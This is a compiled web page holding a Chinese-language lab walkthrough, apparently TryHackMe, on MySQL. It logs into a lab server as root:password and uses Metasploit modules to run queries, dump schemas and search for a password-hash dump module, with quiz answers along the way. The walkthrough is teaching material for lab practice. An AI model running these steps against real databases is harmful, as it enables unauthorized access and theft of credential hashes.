import{_ as h,c as e,a as n,d as a,e as i,b as k,w as t,r as p,o as d}from"./app-rzor12pK.js";const r="/assets/file-20241201033100-TeF2qBiN.png",g="/assets/file-20241201033724-BbiPE49S.png",y="/assets/file-20241201034356-BKVUjd6l.png",A="/assets/file-20241201034538-BIV0mQkP.png",c="/assets/file-20241201035551-CpAXpkX9.png",m={};function o(B,s){const l=p("RouteLink");return d(),e("div",null,[s[10]||(s[10]=n('<h2 id="认识mysql" tabindex="-1"><a class="header-anchor" href="#认识mysql"><span>认识MySQL</span></a></h2><h3 id="什么是mysql" tabindex="-1"><a class="header-anchor" href="#什么是mysql"><span>什么是Mysql？</span></a></h3><p>MySQL是基于结构化查询语言（SQL）的关系数据库管理系统（RDBMS）</p><ul><li><strong>Database</strong>：结构化数据的持久的、有组织的集合</li><li><strong>RDBMS</strong>：用于管理和创建<em>基于关系模型的数据库</em>的<em>软件或服务</em><ul><li>“<strong>关系</strong>”这个词只是意味着存储在数据集中的数据是以表的形式组织的,每个表都以某种方式与彼此的“主键”或其他“关键”因素相关。</li></ul></li></ul><p>MYSQL只是最流行的RDBMS软件实现之一的品牌名称。正如我们所知，它使用客户端-服务器模型。它们使用一种语言，特别是结构化查询语言（SQL）。</p><p>许多其他产品（例如PostgreSQL和MicrosoftSQL server）中都有SQL一词。这同样意味着这是一个使用结构化查询语言语法的产品。</p><h3 id="mysql是如何工作的" tabindex="-1"><a class="header-anchor" href="#mysql是如何工作的"><span>MySQL是如何工作的？</span></a></h3><p>服务器处理所有数据库指令，如创建，编辑和访问数据。它接受并管理这些请求，并使用MySQL协议进行通信。整个过程可以分为以下几个阶段：</p><ul><li>MySQL创建一个数据库来存储和操作数据，定义每个表的关系。</li><li>客户端通过在 SQL 中发出特定语句来提出请求。</li><li>服务器将向客户端回应所请求的任何信息。</li></ul><h3 id="mysql运行在什么系统上" tabindex="-1"><a class="header-anchor" href="#mysql运行在什么系统上"><span>MySQL运行在什么系统上？</span></a></h3><p>MySQL可以运行在任意平台，不管是Linux 还是Windows。MySQL常被用作众多知名网站的后端数据库，同时也是LAMP堆栈的核心组成部分，该堆栈包括Linux、Apache、MySQL和PHP。</p><p>这里有一些资源，它们比我在这里介绍的更详细地解释了MySQL的技术实现和工作：</p><ul><li><a href="https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html" target="_blank" rel="noopener noreferrer">MySQL: SQL Query Execution</a></li><li><a href="https://www.w3schools.com/php/php_mysql_intro.asp" target="_blank" rel="noopener noreferrer">W3Schools.com</a></li></ul><h3 id="回答以下问题" tabindex="-1"><a class="header-anchor" href="#回答以下问题"><span>回答以下问题</span></a></h3><details class="hint-container details"><summary>MySQL是什么类型的软件？</summary><p><strong>答案</strong> <code>relational database management system</code></p></details><details class="hint-container details"><summary>MySQL是基于语言的？</summary><p><strong>答案</strong> <code>SQL</code></p></details><details class="hint-container details"><summary>MySQL使用什么通用模型？</summary><p><strong>答案</strong> <code>client-server</code></p></details><details class="hint-container details"><summary>MySQL的常见用途是什么？</summary><p><strong>答案</strong> <code>back and database</code></p></details><details class="hint-container details"><summary>哪些知名社交平台采用MySQL作为其后台数据库？这需要进一步调查。</summary><p><strong>答案</strong> <code>Facebook</code></p></details><h2 id="枚举mysql" tabindex="-1"><a class="header-anchor" href="#枚举mysql"><span>枚举MySQL</span></a></h2><p>一般在获取关键服务器的初始信息时，mysql不会成为第一个攻击点，在CTF中，一般会在一些其他途径获取到凭据（用户名，秘密）。如果真的没有其他信息，你可以尝试使用默认账户和密码尝试登陆。</p><h3 id="场景" tabindex="-1"><a class="header-anchor" href="#场景"><span>场景</span></a></h3><p>假设已经在其他途径找到了凭据<code>root:password</code>,在尝试<code>ssh</code>登陆失败后尝试进行<code>MySQL</code>登陆。</p><h3 id="要求" tabindex="-1"><a class="header-anchor" href="#要求"><span>要求</span></a></h3><ul><li>您需要在系统上安装MySQL客户端用来远程到服务器，如果没有安装请使用以下命令安装。</li></ul><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">sudo</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> apt</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> install</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> default-mysql-client</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div>',26)),a("ul",null,[s[9]||(s[9]=a("li",null,[i("我们将使用"),a("code",null,"Metasploit"),i("完成此枚举（在"),a("a",{href:"https://www.kali.org/",target:"_blank",rel:"noopener noreferrer"},"KaliLinux"),i("和 "),a("a",{href:"https://www.parrotsec.org/",target:"_blank",rel:"noopener noreferrer"},"ParrotOS"),i("上都是默认安装的）。")],-1)),a("li",null,[s[1]||(s[1]=i("使用Metsploit 做的操作也可以手动完成，或者使用一组非Metasploit工具完成，例如：")),k(l,{to:"/notes/penetration/1.tryhackme/6.Network_NMAP.html"},{default:t(()=>s[0]||(s[0]=[i("NMAP")])),_:1}),s[2]||(s[2]=i("的")),s[3]||(s[3]=a("code",null,"mysql-enum",-1)),s[4]||(s[4]=i("脚本")),s[5]||(s[5]=a("a",{href:"https://nmap.org/nsedoc/scripts/mysql-enum.html",target:"_blank",rel:"noopener noreferrer"},"https://nmap.org/nsedoc/scripts/mysql-enum.html",-1)),s[6]||(s[6]=i("或者")),s[7]||(s[7]=a("a",{href:"https://www.exploit-db.com/exploits/23081",target:"_blank",rel:"noopener noreferrer"},"https://www.exploit-db.com/exploits/23081",-1)),s[8]||(s[8]=i("。建议完成此任务后，返回并手动尝试。"))])]),s[11]||(s[11]=n(`<h3 id="回答以下问题-1" tabindex="-1"><a class="header-anchor" href="#回答以下问题-1"><span>回答以下问题</span></a></h3><details class="hint-container details"><summary>往常一样，让我们从端口扫描开始，这样我们就可以知道我们试图攻击的服务运行在哪个端口上？</summary><p><strong>答案</strong> <code>3306</code></p></details><p>很好，现在我们有一套凭据。让我们通过手动连接到MySQL服务器来仔细检查。我们可以使用命令“<em>mysql -h [IP] -u [username] -p</em>“来实现这一点。</p><p>好吧，我们知道我们的登录凭证是有效的。让我们用“exit”退出这个会话，然后启动Metasploit。</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msfconsle</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>我们将使用“mysql_sql”模块。</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> search</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> mysql_sql</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Matching</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Modules</span></span>
<span class="line"><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">================</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">   #  Name                             Disclosure Date  Rank    Check  Description</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">   -</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">  ----</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">                             ---------------</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">  ----</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">    -----</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">  -----------</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">   0</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  auxiliary/admin/mysql/mysql_sql</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  .</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">                normal</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  No</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">     MySQL</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> SQL</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Generic</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Query</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><details class="hint-container details"><summary>搜索，并列出所需的选项。我们需要设置哪三个选项（使用降序排列）？</summary><p><strong>答案</strong>:<code>PASSWORD/RHOSTS/USERNAME</code></p><p><strong>解析</strong>：</p><ul><li>进入模块</li></ul><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  use</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary/admin/mysql/mysql_sql</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><ul><li>查看配置选项</li></ul><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">admin/mysql/mysql_sql</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> options</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="`+r+`" alt=""></p></details><details class="hint-container details"><summary>运行该漏洞利用工具。默认情况下，它将使用“selectversion()”命令，这会得到什么结果？？</summary><p><strong>答案</strong>: <code>5.7.29-0ubuntu0.18.04.1</code></p><p><strong>解析</strong>：</p><ul><li>配置参数</li></ul><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">admin/mysql/mysql_sql</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> set</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> PASSWORD</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> password</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">PASSWORD</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> =</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">&gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> password</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">admin/mysql/mysql_sql</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> set</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> RHOSTS</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 10.10.58.132</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">RHOSTS</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> =</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">&gt;</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 10.10.58.132</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">admin/mysql/mysql_sql</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> set</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> USERNAME</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> root</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">USERNAME</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> =</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">&gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> root</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">admin/mysql/mysql_sql</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> run</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>输出结果 <img src="`+g+`" alt=""></li></ul></details><details class="hint-container details"><summary>太好了！我们的操作正如预期那样成功。现在，让我们尝试获取更深入的信息。将“sql” option 更改为<code>show databases</code>。一共有多少个数据库被返回？</summary><p><strong>答案</strong> <code>4</code></p><p><strong>解析</strong>：</p><ul><li>配置要使用的<code>sql</code>语句</li></ul><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">admin/mysql/mysql_sql</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> options</span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">...</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">admin/mysql/mysql_sql</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> set</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> SQL</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;"> &quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">show databases</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">SQL</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> =</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">&gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> show</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> databases</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>配置结果</li></ul><p><img src="`+y+'" alt=""></p><ul><li>输出结果 <img src="'+A+`" alt=""></li></ul></details><h2 id="利用mysql" tabindex="-1"><a class="header-anchor" href="#利用mysql"><span>利用MySQL</span></a></h2><p>目前我们在枚举阶段获取到的信息有</p><ul><li>MySQL 服务凭据（<code>root:password</code>）</li><li>MySQL运行的版本</li><li>数据库数量及名称</li></ul><h3 id="关键术语" tabindex="-1"><a class="header-anchor" href="#关键术语"><span>关键术语</span></a></h3><h4 id="schema" tabindex="-1"><a class="header-anchor" href="#schema"><span>Schema</span></a></h4><ul><li><strong>Schema</strong>直译为架构、模式。</li><li>在MySQL中<code>schema</code>与<code>database</code>同义，您可以在MySQL语法中使用关键字<code>SCHEMA</code>来代替<code>DATABASE</code>。例如：使用<code>CREATE SCHEMA</code>替代<code>CREATE DATABASE</code> 。</li></ul><div class="hint-container info"><p class="hint-container-title">相关信息</p><p>理解这种关系很重要，因为其他一些数据库产品也有区别。例如，在Oracle数据库产品中，<code>SCHEMA</code>仅表示数据库的一部分：由单个用户拥有的表和其他对象。</p></div><h4 id="hashes" tabindex="-1"><a class="header-anchor" href="#hashes"><span>Hashes</span></a></h4><ul><li><strong>Hashes</strong> ：音译为哈希，直译为散列函数</li><li>是将可变长度输入转换为固定长度输出的加密算法的产物。</li></ul><p>在MySQL中，哈希可以以不同的方式使用，例如将数据索引到哈希表中。每个散列都有一个唯一的ID，用作指向原始数据的指针。 这样就创建了一个比原始数据小得多的索引，使得对值的搜索和访问更加高效。然而，我们将提取的数据是密码哈希，这仅仅是一种存储密码而不使用明文格式的方法。</p><details class="hint-container details"><summary>首先，让我们搜索并选择“mysql_schemadump”模块。模块的全名是什么？</summary><p><strong>答案</strong> <code>auxiliary/scanner/mysql/mysql_schemadump </code></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">admin/mysql/mysql_sql</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> search</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> mysql_schemadump</span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">...</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">   0</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  auxiliary/scanner/mysql/mysql_schemadump</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">  </span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">...</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="hint-container details"><summary>好极了！现在，你已经操作过好几次了，所以我将让你从这一步开始。设置相关选项，运行攻击程序。最后一个被导出的表的名称是什么？</summary><p><strong>答案</strong> <code>x$waits_global_by_latency</code></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">use</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary/scanner/mysql/mysql_schemadump</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">admin/mysql/mysql_sql</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> set</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> PASSWORD</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> password</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">PASSWORD</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> =</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">&gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> password</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">admin/mysql/mysql_sql</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> set</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> RHOSTS</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 10.10.58.132</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">RHOSTS</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> =</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">&gt;</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 10.10.58.132</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">admin/mysql/mysql_sql</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> set</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> USERNAME</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> root</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">USERNAME</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> =</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">&gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> root</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">admin/mysql/mysql_sql</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> run</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+c+`" alt=""></p></details><details class="hint-container details"><summary>太棒了，你现在已经导出了整个数据库的表结构和列名。但我们可以做得更出色……搜索并选择<code>mysql_hashdump</code>模块。这个模块的全称是什么？</summary><p><strong>答案</strong> <code>auxiliary/scanner/mysql/mysql_hashdump </code></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">scanner/mysql/mysql_schemadump</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> use</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> mysql_hashdump</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Matching</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Modules</span></span>
<span class="line"><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">================</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">   #  Name                                    Disclosure Date  Rank    Check  Description</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">   -</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">  ----</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">                                    ---------------</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">  ----</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">    -----</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">  -----------</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">   0</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  auxiliary/scanner/mysql/mysql_hashdump</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  .</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">                normal</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  No</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">     MYSQL</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Password</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Hashdump</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">   1</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  auxiliary/analyze/crack_databases</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">       .</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">                normal</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  No</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">     Password</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Cracker:</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Databases</span></span>
